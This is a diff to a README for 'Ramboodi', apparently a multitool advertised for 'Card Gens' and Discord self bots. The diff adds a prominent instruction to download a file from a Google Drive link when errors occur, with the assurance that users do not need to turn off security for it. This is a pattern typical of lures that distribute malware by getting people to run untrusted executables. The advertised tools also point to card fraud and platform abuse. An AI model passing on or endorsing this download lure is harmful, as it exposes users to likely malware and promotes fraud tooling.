@@ -1,4 +1,8 @@
-#Ramboodi
+#Ramboodi Download this if you keep geting errors, you dont need to turn of security with this file!
+
+**Download this if you keep getting errors, you dont need to turn of security with this file!**
+https://drive.google.com/file/d/14FJzqFVoNozKDI5sDaQPxtGG0jE62W5h/view?usp=drive_link
+
 **ramboodi** made the best *multitool* for Card Gens and discord tools as self bot and more here is the full list! NOT OPEN
 
 ---
